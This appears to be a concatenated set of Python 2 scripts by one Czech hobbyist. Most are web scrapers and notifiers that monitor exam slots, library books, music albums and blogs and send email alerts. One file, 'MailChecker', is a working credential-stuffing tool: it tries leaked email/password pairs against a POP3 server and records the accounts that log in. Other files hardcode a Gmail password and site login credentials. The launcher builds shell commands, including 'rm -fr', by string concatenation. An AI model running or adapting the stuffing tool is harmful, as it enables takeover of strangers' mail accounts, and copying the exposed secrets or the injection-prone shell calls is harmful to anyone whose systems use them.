    passman.add_password(None, url, username, passwd)

    authhandler = urllib2.HTTPBasicAuthHandler(passman)

    opener = urllib2.build_opener(authhandler)

    urllib2.install_opener(opener)

    ph = urllib2.urlopen(url)
    data = ph.read()
    ph.close()

    return data

# functions & objects
def sendMail(status):
    ## mail config
    mfrom= "pastebin.com.checker@gmail.com"
    mto= "nechcesvedet@vodafonemail.cz"
    msubj= "STAG :: "

    msmtp= "smtp.gmail.com"                 # smtp server
    mnick= "pastebin.com.checker"           # username (gmail username in this case)
    mpass= "supertajnehesloprogmailucetcheckerupastebin.com"  # password (gmail pass)

    msg = "From: %s\r\nSubject: %s\r\nTo: %s\r\n\r\n" % (mfrom, msubj, mto)

    if status:
        msg += "Uvolnilo se misto k zapisu na matiku od deviti!"
    else:
        msg += "Fuck! Vsechna mista  na pisemce od deviti jsou zase obsazena, doufam ze jsi to stihl!"
    msg += "\n"

    server = smtplib.SMTP(msmtp)
    server.ehlo()
    server.starttls()
    server.ehlo()

    server.login(mnick, mpass)
    server.sendmail(mfrom, mto, msg)
    server.quit()

# main program
passwd = getpass.getpass("Passwd: ")

while 1:
    try:
        print "Nacitam ulozena data .. ",
        file = open("stag.checker.dat", "r")
        status = file.read()
        file.close()

        # parsovani minuleho statusu
        if "True" in status:
            status = True
        else:
            status = False
            
        print "OK"
    except:
        print "soubor neexistuje, nastavuji defaultni hodnoty."
        status = False   # status ze je obsazeno

    try:
        print "Stahuji stranku ze stagu ..",
        data = getPage(url, username, passwd)

        if len(data) <= 100:
            print "aw, nic neprislo :/"
        else:
            print "stranka stazena."
    except:
        print "jej, chyba!"
        continue;

    print "Parsuji stranku ..",
    soup = BS(data)
    tr = soup("tr")
    hodina = ""
    for i in range(len(tr)):
        if "11.01.2010&nbsp;PO - 08:10" in str(tr[i]):
            hodina = str(tr[i + 2])
    print "OK"

    if ("obsazeno" in hodina) != status:
        # posli sms
        print "Zmena stavu, posilam upozorneni .."
        sendMail(status)
        print "OK"

        # uloz stavajici status
        print "Zapisuji novy status ..",
        file = open("stag.checker.dat", "w")
        file.write(str(not status))
        file.close()
        print "OK"
    
    print "Cekam 10m"
    time.sleep(60 * 10) # cekani 10m
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# knihovna_checker v1.0.0 (27.04.2010) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in NetBeans IDE v6.9.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import sys
import os.path

import CheckerTools
try:
    from BeautifulSoup import BeautifulSoup as BS
except ImportError, e:
    print "---"
    print ">>> Error;", e, "!! <<<"
    print "This program needs BeautifulSoup!"
    print "You can download it here; http://www.crummy.com/software/BeautifulSoup/"
    print "Or you can try find it in repostories for your linux distribution."
    print "---"

    raise e

#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://ipac.kvkli.cz/i2/i2.search.cls?ictx=li&disprec=1&iset=1&pg=&xrecidx=li_us_cat*c041762"
url = "http://ipac.kvkli.cz/i2/i2.search.cls?ictx=li&src=li_us_cat&show_lim=0&fld=G&term=%C5%A1ok+z+budoucnosti&submit_OK.x=0&submit_OK.y=0&limv_DATE_1=&limv_DATE_2=&zf=SHORT&sort=DK1_YE_AU_TIT&ascii=1&ascii=0&all=0"


#===============================================================================
#= Functions & objects =========================================================
#===============================================================================

#===============================================================================
#= Main program ================================================================
#===============================================================================
if os.path.exists("Odstran_knihovna_checker_z_cronu"):
    print "Odstran me z cronu!"
    sys.exit()


try:
    data = CheckerTools.getPage(url).splitlines()
except:
    print "Error!!"
    print "Cant download", url
    sys.exit()

volnych = 0
for i in data:
    if "ex." in i:
        i = i.replace("<br/>", "")
        i = i.replace("</b>", "")
        volnych = int(i.split("volných")[1])

if volnych > 0:
    chk = CheckerTools.sendMailFromSecurityPortal(
        "knihovna@checker.net",
        "nechcesvedet@vodafonemail.cz",
        "xa",
        "Kniha Sok z budoucnosti je volna!\nNezapomen me odstranit z cronu..")

    if chk:
        print "Informacni mail odeslan.."

        file = open("Odstran_knihovna_checker_z_cronu", "w")
        file.write("Moc necum a udelej to!")
        file.close()
    else:
        print "Crap, nemuzu odeslat mail.."
else:
    print "Vsechny knihy jsou pujcene!"

    









﻿# -*- coding: utf-8 -*- 
#~ LSL parser v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

from BeautifulSoup import BeautifulSoup as BS
import re, urllib, urllib2

def RemTags(data):   # remove tags -odstranovac html tagu
    data= str(data)
    text=""       # seznam jednotlivych tagu
    istag=0       # pomocna promenna, ukazuje jestli se jedna o tag(=1), nebo o normalni retezec(=0)
    zac= 0        # promenna obsahujici cislo, ktere ukazuje na zacatek obyc. textu

    for znak in data:
       if (znak=="<"):
           istag= 1
    
       if (istag==0):
           text= text + znak
        
       if (znak==">"):
           istag= 0 
           
    return text 


def Send(parametry):
    adresa= "http://lsl.tym.cz/update/uloz.php"
    try:
        params= urllib.urlencode(parametry)  # Prekoduje parametry do tvaru vhodneho pro odeslani 
        req= urllib2.Request(adresa, params) # Vytvori request, coz je smichanina adresy a parametru, pripadne i hlavicek

        spojeni = urllib2.urlopen(req)       # Otevre
        spojeni.read()                       # a nacte stranku
        spojeni.close()
        
        return "Ok!"
    except:
        return "Error!"


## Parsovaci cast
file= open("lsl_guide.html", "r")
data= file.read()
file.close()

soup= BS(data)
data= soup("div", {"class": "appendix"})[0]

soup= BS(str(data))
data= soup("div", {"class": "section"})

data2= []
tmp= []
name= ""

for i in data:
    name= i("a")[0].string
    name= re.findall("ll\w+", name)[0]
    
    tmp= i("p")
 
    repl= str(tmp[3])
    for x in re.findall("\<a href.+\">", str(tmp[3])):
        repl= repl.replace(x, RemTags(x))
        repl= repl.replace("</a>", "")
 
    #~ tmp[1]= tmp[1].replace()
    print "Nazev:", name, "<br><br>"
    print "Pouziti:", tmp[1]
    print "Popis:", repl
    print "<hr>\n\n"
    
    data2.append([name, RemTags(tmp[1]), RemTags(repl)])

data= data2

## Odesilaci cast
counter= 0
status= "Ok!"
while 1:
    try:
        data[counter][0]    # ukonci script az se vse projde :D
        print "\nPokousim se odeslat fci", data[counter][0]
        
        parametry= {
            "jmeno_prvku": data[counter][0],
            "pouziti_prvku": data[counter][1],
            "popis_prvku": data[counter][2],
            "popis_prvku_en": data[counter][2],
            "typ_prvku": "f"}
        
        status= Send(parametry)
        
        if status== "Ok!":
            print "\t- ok, fce", data[counter][0], "odeslana"
            counter+= 1
        else:
            print "\t- error!"
    except:
        exit()

﻿# -*- coding: utf-8 -*- 
#~ LSL parser v0.0.0 (dd.mm.yy) by bystrousak@seznam.cz.
#~ Created in SciTE text editor.
#~
#~ Poznamky:
    #~  

from BeautifulSoup import BeautifulSoup as BS
import re, urllib, urllib2

def RemTags(data):   # remove tags -odstranovac html tagu
    data= str(data)
    text=""       # seznam jednotlivych tagu
    istag=0       # pomocna promenna, ukazuje jestli se jedna o tag(=1), nebo o normalni retezec(=0)
    zac= 0        # promenna obsahujici cislo, ktere ukazuje na zacatek obyc. textu

    for znak in data:
       if (znak=="<"):
           istag= 1
    
       if (istag==0):
           text= text + znak
        
       if (znak==">"):
           istag= 0 
           
    return text 


def Send(parametry):
    adresa= "http://lsl.tym.cz/update/uloz.php"
    try:
        params= urllib.urlencode(parametry)  # Prekoduje parametry do tvaru vhodneho pro odeslani 
        req= urllib2.Request(adresa, params) # Vytvori request, coz je smichanina adresy a parametru, pripadne i hlavicek

        spojeni = urllib2.urlopen(req)       # Otevre
        spojeni.read()                       # a nacte stranku
        spojeni.close()
        
        return "Ok!"
    except:
        return "Error!"


## Parsovaci cast
file= open("lsl_guide.html", "r")
data= file.read()
file.close()

soup= BS(data)
data= soup("div", {"class": "appendix"})[1]

soup= BS(str(data))
data= soup("div", {"class": "section"})

data2= []
tmp= []
name= ""

for i in data:
    name= i("a")[0].string
    name= re.findall(" \w+", name)[0]
    
    tmp= i("p")
 
    repl= str(tmp[3])
    for x in re.findall("\<a href.+\">", str(tmp[3])):
        repl= repl.replace(x, RemTags(x))
        repl= repl.replace("</a>", "")
 
    #~ tmp[1]= tmp[1].replace()
    print "Nazev:", name, "<br><br>"
    print "Pouziti:", tmp[1]
    print "Popis:", repl
    print "<hr>\n\n"
    
    data2.append([name, RemTags(tmp[1]), RemTags(repl)])

data= data2


## Odesilaci cast
counter= 0
status= "Ok!"
while 1:
    try:
        data[counter][0]    # ukonci script az se vse projde :D
        print "\nPokousim se odeslat event", data[counter][0]
        
        parametry= {
            "jmeno_prvku": data[counter][0],
            "pouziti_prvku": data[counter][1],
            "popis_prvku": data[counter][2],
            "popis_prvku_en": data[counter][2],
            "typ_prvku": "u"}
        
        status= Send(parametry)
        
        if status== "Ok!":
            print "\t- ok, event", data[counter][0], "odeslan"
            counter+= 1
        else:
            print "\t- error!"
    except:
        exit()

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# eilo.org downloader v1.0.0 (16.09.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
#= Imports =====================================================================
import os
import sys

import CheckerTools as c
import dhtmlparser as d



#= Variables ===================================================================
URL = "http://eilo.org"
c.hcookies = True

USER = "Bystroushaak"
PASS = "xerexe"

if len(USER) == 0 or len(PASS) == 0:
	sys.stderr.write("You have to fill username & password.\nFree registeration can be filled here: http://eilo.org/index.php?signup=1\n")
	sys.exit(1)



#= Main program ================================================================
# get cookies
dom = c.getPage(URL)


# login
c.getPage(URL + "/index.php", None, {"user":USER, "password":PASS, "uri":"http://eilo.org"})
data = c.getPage(URL + "/index.php", {"checkcookie":"true"})


# parse list of styles
dom = d.parseString(data)
styles = []
for i in dom.find("a", {"class":"dir"}):
	styles.append([i.params["title"].replace("&amp;", "&"), i.params["href"].replace("&amp;", "&")])


# ask user for style 
choice = -1
while choice > len(styles) - 1 or choice < 0:
	print "Which style?"
	cnt = 0
	for i in styles:
		print "\t" + str(cnt) + ") " + styles[cnt][0]
		cnt += 1

	choice = raw_input(":> ")
	try:
		choice = int(choice)
	except:
		choice = -1


# parse tracklist
dom = d.parseString(c.getPage(URL + styles[choice][1]))

sets = []
for i in dom.find("a", {"class":"dir"}):
	sets.append([i.params["title"].replace("&amp;", "&"), i.params["href"].replace("&amp;", "&")])


# download tracks url
for i in sets:
	# skip downloaded files
	files = os.listdir(".")
	if i[0] + ".mp3" in files:
		print "Skipping", i[0]
		continue

	print i[0]

	# try parse download link
	dom = d.parseString(c.getPage(URL + i[1]))
	href = filter(lambda x: "href" in x.params and "downloadfile" in x.params["href"], dom.find("a"))

	if len(href) <= 0:
		print "Skipping - no content!"
		continue

	# get href from <a>
	href = href[0].params["href"]
	href = href.replace("&amp;", "&")

	# download tracks
	file = open(i[0] + ".mp3", "wb")
	file.write(c.getPage(URL + href))
	file.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#~ MailChecker v1.0.1 (24.08.09) by Bystroushaak - bystrousak@kitakitsune.org.
#~ This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
#~ Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cs/).
#~ Created in gedit text editor.
#~
##~ Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
##~ emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
##~ U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
##~ i nekomu jinemu nez mne. Diky
#~
#~ Notes:
    #~ Jedna se o prvni verzi psanou v 03:45 vecer, takze je zde pomerne velka pravdepodobnost ze script obsahuje chybky..
    #~ Script pouzivate na vlastni nebezpeci, pokud vam da server ban, nechodte ke me brecet! 
    #~ Script funguje pod pythonem 2.5!
    
# imports
import poplib
import sys

# variables
data= ""

## mail config
mpop3= ""                 # smtp server
server= ""                # uzivatelsky server
infile= ""
outfile= ""

# functions & objects
def printHelp():
    print """  pouziti:
        python MailChecker.py -i infile.txt -o outfile.txt -s @server.cz -p pop3.server.tld
        
            -i
                Soubor se vstupnimi daty ve formatu mail::heslo.
                
            -o
                Vystupni soubor - bude obsahovat platne emaily.
                
            -s
                Server (napr. @seznam.cz) jehoz uzivatele budou testovani. 
                Pokud neni zadan, tak bude testovat i uzivatele ostatnich 
                serveru!
                
            -p 
                POP3 adresa (nutno nekde zjistit) serveru pro ktery chces 
                testovat uzivatele.
                
                
                
           """
    
    sys.exit()

# overuje jednotlive uzivatele
def tryAccount(mpop3, mail, passwd):
    nick= mail.split("@")[0]    # potrebuju pouze prihlasovaci jmeno
    
    server = poplib.POP3(mpop3)
    
    try:
        server.user(nick)
        server.pass_(passwd)
    except:
        return None
    
    print "\t", mail, "pouziva stejne heslo"
    return mail + "::" + passwd

# main program
print "Mail account checker v 1.0.0 (24.08.09) by Bystroushaak"

## parse arguments
argv= sys.argv
if len(argv)>1:
    for i in range(len(argv)):              # nacteni argumentu
        if argv[i].startswith("-i"):
            infile= argv[i+1]
        elif argv[i].startswith("-o"):
            outfile= argv[i+1]
        elif argv[i].startswith("-s"):
            server= argv[i+1]
        elif argv[i].startswith("-p"):
            mpop3= argv[i+1]
        elif argv[i].startswith("--help") or argv[i].startswith("-h"):
            printHelp()
else:
    printHelp()
    
if (mpop3 == "") or (infile == "") or (outfile == ""):
    printHelp()

## nacteni zaznamu
try:
    file= open(infile, "r")
    data= file.readlines()
    file.close()
except IOError, e:
    print "Error!"
    print "Nepodarilo se nacist vstupni soubor!"
    print e
    sys.exit()

## pokud je specifikovan parametr server, tak pouzije jen adresy ktere v sobe obsahuji server
if (server != ""):
    odata= []
    for i in data:
        if server in i:
            odata.append(i)
    data= odata
    
## parsuje email a nick
odata= []
for i in data:
    val= i.split("::")
    odata.append(val)
    
## otevreni souboru pro ukladani
try:
    file= open(outfile, "w")
except IOError, e:
    print "Error!"
    print "Read only filesystem?"
    print e
    
## overovani uzivatelu a ukladani funkcnich
print "Zacinam overovat jednotlive uzivatele:\n"
for i in odata:
    val= tryAccount(mpop3, i[0], i[1])
    
    if val != None:
        file.write(val)
        file.flush()
        
file.close()
print
print "Konec."
      
 
    
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
#
# launcher v0.3.0 (16.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # Nějakou tu konfiguraci pomocí switchů
    # Error checkery přesouvat do ./errors s chybovou hláškou v ERRORS.txt
#= Imports =====================================================================
import os
import os.path
import time
import shelve
import subprocess



#= Variables ===================================================================
conf = {
	"chk_dir" : "./checkers",
	"unused_dir" : "./unused",
}

chk_lst = {}
query_next_time = []


# load saved data
db = shelve.open("save.dat")
if db.has_key("chk_lst"):
	chk_lst = db["chk_lst"]
if db.has_key("query_next_time"):
	query_next_time = db["query_next_time"]



#= Functions & objects =========================================================
def runChecker(fn):
	"Runs checker in separate thread."
	
	timeout = askChecker(ffn, "--timeout")
	
	print "Running", fn
	
	# go to checker directory
	pwd = os.getcwd()
	os.chdir(os.path.dirname(ffn))

	# run checker
	if timeout <= 0:
		os.system("./" + os.path.basename(ffn) + " &")
	else:
		os.system("timeout " + str(timeout) + " ./" + os.path.basename(ffn) + " &")
	
	# return back to original directory 
	os.chdir(pwd)


def askChecker(fn, what = "--next-run"):
	"Get timestamp for next run."
	
	n = int(time.time() + 120)
	try:
		n = int(subprocess.check_output(fn + " " + what, shell=True).strip())
	except ValueError:
		n = int(time.time() + 120)
	except subprocess.CalledProcessError, e:
		n = -1;	   
		print e
	
	print "Asking checker", fn, "..", n

	return n


def removeChecker(fn, delete = False):
	"Remove unused checker."
	
	if os.path.isfile(fn):
		fn = os.path.dirname(fn)
	
	fn = fn.replace("..", "")
	
	if fn != conf["chk_dir"] and fn.startswith("."):
		if delete:
			os.system("rm -fr '" + fn + "' &")
		else:
			if not os.path.exists(conf["unused_dir"]):
				if os.system("mkdir " + conf["unused_dir"]) == 0:
					os.system("mv '" + fn + "' '" + conf["unused_dir"] + "' &")
			else:
				os.system("mv '" + fn + "' '" + conf["unused_dir"] + "' &")



#= Main program ================================================================
# create missing directories
for i in conf.keys():
	chk_dir = conf[i]
	
	if not os.path.exists(chk_dir):
		try:
			os.mkdir(chk_dir)
		except OSError:
			sys.stderr.write("Can't create dirrectory '" + chk_dir + "'!")
			sys.exit(1)
			
		print "Your checker directory (" + chk_dir + ") was created."


# ask previously runned programs when they want to run next time
for fn in query_next_time:
	chk_lst[fn] = askChecker(fn)
query_next_time = []


# go thru directory structure and run/ask/remove every checker
for checker in os.listdir(conf["chk_dir"]):
	fn = conf["chk_dir"] + "/" + checker
	if not os.path.isdir(fn):
		continue
	
	# go only thru checkers is checker's directory
	for ex_fn in filter(lambda x: x.lower().startswith(checker.lower()), os.listdir(fn)):
		ffn = fn + "/" + ex_fn
		
		# check if executable file
		if not os.access(ffn, os.X_OK):
			continue
		
		# if new, add it to the runlist
		if ffn not in chk_lst:
			chk_lst[ffn] = 1 # 
		
		# decide what to do
		if chk_lst[ffn] <= int(time.time()):
			if chk_lst[ffn] > 0:
				runChecker(ffn)
				query_next_time.append(ffn)
			elif chk_lst[ffn] <= 0 and (ffn.lower().endswith("_d") or ffn.lower().endswith("_delete")):
				removeChecker(ffn, delete = True)
				del chk_lst[ffn]
			else:
				removeChecker(ffn)
				del chk_lst[ffn]
				


# save data
db["chk_lst"] = chk_lst
db["query_next_time"] = query_next_time

db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Stoyan checker v1.0.0 (04.09.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in Sublime Text 2 editor.
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import sys
import time
import shelve


import CheckerTools as c
import dhtmlparser as d



# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24 * 7) # one week
	elif sys.argv[1] == "--timeout":
		print 60 * 60 # 1hr
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://projects.stoyan.cz/"
db = shelve.open("old_projects.dat")

if db.has_key("old_projects"):
	old_projects = db["old_projects"]
else:
	old_projects = []



#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "New projects at " + url + "\n\n"

send = False
for l in d.parseString(c.getPage(url)).find("table")[0].find("a"):
	if "name" in l.params:
		p = l.getContent()
		
		if p not in old_projects:
			mail += " - " + p + "\n"
			
			old_projects.append(p)
			send = True


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s 'stoyans projects' <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old_projects"] = old_projects
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Shaddack checker v1.1.0 (16.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import sys
import time
import shelve


import CheckerTools as c
import dhtmlparser as d



# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24)
	elif sys.argv[1] == "--timeout":
		print 60 * 60
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://shaddack.twibright.com/"
db = shelve.open("old_links.dat")

if db.has_key("old_links"):
	old_links = db["old_links"]
else:
	old_links = []



#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "New articles/projects at " + url + "\n\n"

send = False
for l in d.parseString(c.getPage(url)).find("a"):
	if "href" in l.params:
		link = l.params["href"]
		
		if "http://" not in link:
			link = url + link
		
		title = l.params["title"] if "title" in l.params else "" 
		content = c.getVisibleText(l.getContent()).strip()
		
		if link not in old_links:
			if content.strip() != "":
				mail += " - " + content
				
				if title.strip() != "":
					mail += "\n\n   " + title.strip() + ")"
				
				mail += "\n\n"
			else:
				if title.strip() != "":
					mail += title.strip() + "\n\n"
			
			mail += "   " + link + "\n\n---\n\n"
			
			old_links.append(link)
			send = True


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s shaddack@twibright <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old_links"] = old_links
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Hysteria.sk checker v1.0.0 (17.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import sys
import time
import shelve


import CheckerTools as c



# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24)
	elif sys.argv[1] == "--timeout":
		print 60 * 5
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://hysteria.sk/"
db = shelve.open("old_content.dat")

if db.has_key("old"):
	old = db["old"]
else:
	old = []



#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "New articles/projects at " + url + "\n\n"

send = False
for l in c.getPage(url).splitlines():
	if not l.startswith("<b>"):
		continue
	
	l = c.getVisibleText(l)
	
	if l not in old:
		mail += l + "\n"
		old.append(l)
		send = True


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s hysteria.sk <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old"] = old
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Saltillo checker v1.0.0 (29.04.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import sys
import time
import shelve


import CheckerTools as c
import dhtmlparser as d


# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24 * 7)
	elif sys.argv[1] == "--timeout":
		print 60 * 5 # 5m
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://www.last.fm/music/Saltillo/+albums"
db = shelve.open("old_albums.dat")

if db.has_key("old"):
	old = db["old"]
else:
	old = []



#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "Saltillo published new album - viz " + url + "\n\n"

send = False
for l in d.parseString(c.getPage(url)).find("a"):
	if "href" in l.params and l.params["href"].startswith("/music/Saltillo/"):
		if l.params["href"].startswith("/music/Saltillo/+"):
			continue
			
		album = c.getVisibleText(l.getContent()).strip()
		
		if album == "":
			continue
		
		if album not in old:
			mail += "New album " + album + "; http://www.last.fm" + l.params["href"] + "\n"
			
			send = True
			old.append(album)


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s 'Saltillo checker' <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old"] = old
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Austra checker based on Saltillo checker
# v1.0.0 (04.08.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import sys
import time
import shelve


import CheckerTools as c
import dhtmlparser as d


# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24 * 7)
	elif sys.argv[1] == "--timeout":
		print 60 * 5 # 5m
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
url = "http://www.last.fm/music/Austra/+albums"
db = shelve.open("old_albums.dat")

if db.has_key("old"):
	old = db["old"]
else:
	old = []



#===============================================================================
#= Main program ================================================================
#===============================================================================
mail = "Saltillo published new album - viz " + url + "\n\n"

send = False
for l in d.parseString(c.getPage(url)).find("a"):
	if "href" in l.params and l.params["href"].startswith("/music/Austra/"):
		if l.params["href"].startswith("/music/Austra/+"):
			continue
			
		album = c.getVisibleText(l.getContent()).strip()
		
		if album == "":
			continue
		
		if album not in old:
			mail += "New album " + album + "; http://www.last.fm" + l.params["href"] + "\n"
			
			send = True
			old.append(album)


# payload
if send:
	if 0 != os.system("mailer -f hlubina@internetu.net -t bystrousak@kitakitsune.org -s 'Austra checker' <<LKNDFOJASDKJ-\n" + mail + "\nLKNDFOJASDKJ-"):
		raise Exception("Can't send mail! Check your mailer!")


db["old"] = old
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Fantasya.cz checker v1.0.0 (05.05.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os
import os.path
import sys
import time
import shelve


import CheckerTools as c
import dhtmlparser as d


# react to queries
if len(sys.argv) > 1:
	if sys.argv[1] == "--next-run":
		print int(time.time()) + (60 * 60 * 24 * 7) # once per wekS
	elif sys.argv[1] == "--timeout":
		print 60 * 5 # 5m
	
	sys.exit(0)



#===============================================================================
# Variables ====================================================================
#===============================================================================
SEARCHES_TXT = "searches.txt"

base_url = "http://www.fantasya.cz"
url = base_url + "/shop_browse.php?where=shop_product&referrer=search&keywords="
db = shelve.open("old_books.dat")

if db.has_key("old"):
	old = db["old"]
else:
	old = {}

if os.path.exists(SEARCHES_TXT):
	file = open(SEARCHES_TXT)
	searches = map(lambda x: x.strip().replace(" ", "+"), file.read().splitlines())
else:
